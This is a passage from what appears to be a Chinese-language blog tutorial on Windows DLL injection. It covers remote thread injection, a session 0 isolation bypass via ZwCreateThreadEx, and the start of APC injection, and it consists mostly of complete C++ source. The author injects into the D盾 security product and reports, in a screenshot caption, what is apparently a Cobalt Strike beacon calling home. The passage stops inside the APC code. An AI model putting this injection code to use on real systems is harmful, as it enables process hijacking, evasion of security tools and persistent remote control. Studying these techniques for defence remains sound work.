Error\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待线程函数结束，获得退出码</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">GetExitCodeThread</span>(hThread, &amp;DllAddr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放DLL空间</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hprocess, pDllAddr, _Size, MEM_DECOMMIT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭句柄</span></span><br><span class="line">::<span class="built_in">CloseHandle</span>(hprocess);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">DWORD _PID = <span class="number">1220</span>;<span class="comment">// 根据实际进程的PID填入</span></span><br><span class="line">_RemoteThreadInjection(_PID, <span class="string">L&quot;C:\\Users\\icfh\\source\\repos\\DLLInjection\\Release\\DLLInjection.dll&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注入之前：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401291541808.png" alt="image-20240129154125529"></p><p>注入之后：可以观察到其实不止多了DLLInjection.dll文件</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401291542782.png" alt="image-20240129154201976"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401291542597.png" alt="image-20240129154215615"></p><h2 id="突破SESSION-0-隔离的远线程注入"><a href="#突破SESSION-0-隔离的远线程注入" class="headerlink" title="突破SESSION 0 隔离的远线程注入"></a>突破SESSION 0 隔离的远线程注入</h2><p>在远程线程注入中，将目标进程改为一些系统服务进程时会发现失败，这是由于存在SESSION 0隔离的安全机制，传统的远程线程注入并不能突破SESSION 0隔离</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401291548406.png" alt="image-20240129154717719"></p><h3 id="Session-0隔离机制"><a href="#Session-0隔离机制" class="headerlink" title="Session 0隔离机制"></a>Session 0隔离机制</h3><p>参考：<a href="https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361?ranMID=46131&ranEAID=a1LgFw09t88&ranSiteID=a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew&epi=a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew&irgwc=1&OCID=AIDcmm549zy227_aff_7806_1243925&tduid=(ir__9uapagd1yckfdy1ee922gm0muf2x9ijmfkvrdmhp00)(7806)(1243925)(a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew)()&irclickid=_9uapagd1yckfdy1ee922gm0muf2x9ijmfkvrdmhp00">https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361?ranMID=46131&amp;ranEAID=a1LgFw09t88&amp;ranSiteID=a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew&amp;epi=a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew&amp;irgwc=1&amp;OCID=AIDcmm549zy227_aff_7806_1243925&amp;tduid=(ir__9uapagd1yckfdy1ee922gm0muf2x9ijmfkvrdmhp00)(7806)(1243925)(a1LgFw09t88-sZl3oC8zh0wtsoCoffRIew)()&amp;irclickid=_9uapagd1yckfdy1ee922gm0muf2x9ijmfkvrdmhp00</a></p><p>在早期Windows版本中（WinXP，WinServer2003以及之前），所有服务都与登录到控制台的第一个用户（超级管理员）处于同一个会话中，该会话即所谓的Session 0，此时其他非系统服务等同于拥有超级管理员权限来执行，那么此时遭遇劫持就直接最高权限了。</p><p>此后在Windows内核6.0版本后引入了Session 0隔离机制，只有系统进程和服务才会处于session 0中运行，用户登录到会话1，后续用户登录到2,3 …</p><p>Session 0隔离机制使得当创建一个进程后不立即执行，而是先挂起进程，在查看运行的进程所在的会话层之后再决定是否恢复进程运行。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401291617173.gif;charset=UTF-8"></p><h3 id="WinAPI介绍-2"><a href="#WinAPI介绍-2" class="headerlink" title="WinAPI介绍"></a>WinAPI介绍</h3><p>原理与远程线程注入的原理大致相同，但是使用的WinAPI是比CreateRemoteThread更为底层的ZwCreateThreadEx函数来创建线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// win64</span></span><br><span class="line">DWORD WINAPI ZwCreateThreadEx&#123;</span><br><span class="line">    PHANDLE ThreadHandle,</span><br><span class="line">    ACCESS_MASK DesiredAccess,</span><br><span class="line">    LPVOID ObjectAttributes,</span><br><span class="line">    HANDLE ProcessHandle,</span><br><span class="line">    LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">    LPVOID lpParameter,</span><br><span class="line">    ULONG CreateThreadFlags,</span><br><span class="line">    SIZE_T ZeroBits,</span><br><span class="line">    SIZE_T StackSize,</span><br><span class="line">    SIZE_T MaximumStackSize,</span><br><span class="line">    LPVOID pUnkown</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// win32</span></span><br><span class="line">DWORD WINAPI ZwCreateThreadEx&#123;</span><br><span class="line"> PHANDLE ThreadHandle,</span><br><span class="line">    ACCESS_MASK DesiredAccess,</span><br><span class="line">    LPVOID ObjectAttributes,</span><br><span class="line">    HANDLE ProcessHandle,</span><br><span class="line">    LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">    LPVOID lpParameter,</span><br><span class="line">    BOOL CreateSuspended,</span><br><span class="line">    DWORD dwStackSize,</span><br><span class="line">    DWORD dw1,</span><br><span class="line">    DWORD dw2,</span><br><span class="line">    LPVOID pUnknown</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="操作过程-2"><a href="#操作过程-2" class="headerlink" title="操作过程"></a>操作过程</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 突破session 0隔离机制注入DLL</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="comment">//#include &quot;tchar.h&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用typedef对ZwCreateThreadEx创建函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hToken;</span><br><span class="line">BOOL flag = FALSE;</span><br><span class="line"><span class="comment">// OpenProcessToken 打开与进程关联的token</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">&#123;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="number">0</span>].Luid);</span><br><span class="line"></span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"><span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(tp), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> valueGetLastError = <span class="built_in">GetLastError</span>();</span><br><span class="line"></span><br><span class="line">flag = (valueGetLastError == ERROR_SUCCESS);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">BypassSession0Injection</span><span class="params">(DWORD _PID, <span class="type">const</span> <span class="type">char</span>* DLLPath)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 变量声明</span></span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">    LPVOID pDllAddr = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC LoadLibraryA_Addr = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE hRemoteThread = <span class="literal">NULL</span>;        <span class="comment">// 远程线程</span></span><br><span class="line">    DWORD dwStatus = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 提权 -- 启用SeDebugPrivilege权限</span></span><br><span class="line">    <span class="comment">//BOOL isPrivieged = EnableDebugPrivilege();</span></span><br><span class="line">    <span class="comment">//if (isPrivieged == FALSE) &#123;</span></span><br><span class="line">    <span class="comment">//    printf(&quot;Can&#x27;t get SeDebugPrivilege!\n&quot;);</span></span><br><span class="line">    <span class="comment">//    return FALSE;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 由于具有SeDebugPrivilege，所以可以对系统服务设置为PROCESS_ALL_ACCESS</span></span><br><span class="line">    hProcess = ::<span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, _PID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Open Process Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请内存</span></span><br><span class="line">        <span class="comment">// 申请内存的大小</span></span><br><span class="line">    dwSize = ::<span class="built_in">strlen</span>(DLLPath) + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// ::lstrlen    对于宽字符串</span></span><br><span class="line">            <span class="comment">// ::strlen    对于字符串</span></span><br><span class="line">        <span class="comment">// 申请，返回基地址</span></span><br><span class="line">    pDllAddr = ::<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Virtual Allocation Error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入DLL路径</span></span><br><span class="line">    BOOL isWriteSuccess = ::<span class="built_in">WriteProcessMemory</span>(hProcess, pDllAddr, DLLPath, dwSize, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (isWriteSuccess == FALSE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Write Process Memory Error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载ntdll.dll</span></span><br><span class="line">    HMODULE hNtdDll = ::<span class="built_in">LoadLibrary</span>(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hNtdDll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Load ntdll.dll Error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取LoadLibraryA函数地址</span></span><br><span class="line">    LoadLibraryA_Addr = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (LoadLibraryA_Addr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Get the address of LoadLibrary Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得ZwCreateThreadEx函数地址</span></span><br><span class="line">        <span class="comment">// 使用函数指针类型的变量来接收</span></span><br><span class="line">    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::<span class="built_in">GetProcAddress</span>(hNtdDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ZwCreateThreadEx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Get the address of LoadLibrary Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用ZwCreateThreadEx创建远程线程，实现DLL注入</span></span><br><span class="line">    dwStatus = <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS,</span><br><span class="line">        <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryA_Addr, pDllAddr,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThread Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭句柄</span></span><br><span class="line">    ::<span class="built_in">CloseHandle</span>(hProcess);        <span class="comment">// 对于HANDLE</span></span><br><span class="line">    ::<span class="built_in">FreeLibrary</span>(hNtdDll);         <span class="comment">// 对于HModule</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">    BOOL flag = <span class="built_in">BypassSession0Injection</span>(<span class="number">3788</span>, <span class="string">&quot;C:\\Users\\icfh\\source\\repos\\DLLInjection\\Release\\DLLInjection.dll&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    BOOL flag = <span class="built_in">BypassSession0Injection</span>(<span class="number">4740</span>, <span class="string">&quot;C:\\Users\\icfh\\Desktop\\artifact_x86.dll&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (flag == FALSE) &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;fail!&quot;</span>, <span class="string">L&quot;BypassSession0Injection&quot;</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;success!&quot;</span>, <span class="string">L&quot;BypassSession0Injection&quot;</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择D盾开刀</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404102119766.png" alt="image-20240129225520558"></p><p>CS上线</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404102119704.png" alt=" "></p><h2 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h2><h3 id="APC机制"><a href="#APC机制" class="headerlink" title="APC机制"></a>APC机制</h3><p>在Windows系统中，APC机制是一种并发机制，用于异步IO或者定时器，每个线程都会维护一个线程APC队列，通过QueueUserAPC函数把一个APC函数压入APC队列中。当处于用户模式的APC压入线程APC队列后，该线程并不直接调用APC函数，除非该函数处于可通知的状态，调用顺序为先入先出。</p><h3 id="WinAPI介绍-3"><a href="#WinAPI介绍-3" class="headerlink" title="WinAPI介绍"></a>WinAPI介绍</h3><p>QueueUserAPC函数：将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">QueueUserAPC</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ PAPCFIMC pfnAPC,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HANDLE hThread,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ ULONG_PTR dwData</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><h3 id="操作过程-3"><a href="#操作过程-3" class="headerlink" title="操作过程"></a>操作过程</h3><ul><li><p>通过OpenProcess函数打开目标进程，获取目标进程的句柄</p></li><li><p>遍历线程快照，获取所有线程ID</p></li><li><p>调用VirtualAllocEx函数在目标进程中申请内存，再调用WriteProcessMemory写入DLL路径</p></li><li><p>遍历获取的线程ID，并调用OpenThread函数以THREAD_ALL_ACCESS访问权限打开线程，获取线程句柄</p><p>并调用QueueUserAPC函数向每个线程插入APC函数，设置APC函数的地址为LoadLibraryA函数的地址，APC函数参数为上述DLL路径地址</p></li><li><p>唤醒任意线程，即可执行APC，完成DLL的APC注入</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// APCInjection.cpp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 